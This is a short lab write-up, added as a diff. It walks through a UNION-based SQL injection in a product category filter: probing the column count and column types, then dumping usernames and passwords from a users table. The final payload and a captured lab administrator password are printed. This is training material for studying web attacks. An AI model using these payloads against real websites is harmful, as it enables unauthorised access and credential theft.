@@ -1,0 +1,29 @@
+SQL Injection in the product category filter
+
+Goal: retrieve all username and passwords, and use the information to login as the administrator user.
+
+Analysis:
+---------
+
+==========Step 1: Determine the number of columns that the vulnerable query is using==========
+' order by 1--      /*The first column is the title*/
+' order by 2--      /*The second column is the text*/
+' order by 3--      !Error!
+-> The number of columns 2
+
+==========Step 2: Determine the data type of columns==========
+select a,b from products where category='Gifts
+
+' UNION select 'a', NULL--
+' UNION select 'a', 'a'--
+-> Both columns are of data type string.
+
+==========Solution==========
+' UNION select username, password from users--
+
+administrator
+5qd2us305vk73xv0wkzl
+
+/*If there were only one column that is output on the page or only one column that has data type of string, I will have to output each column on each own.*/
+
+script.py <url>
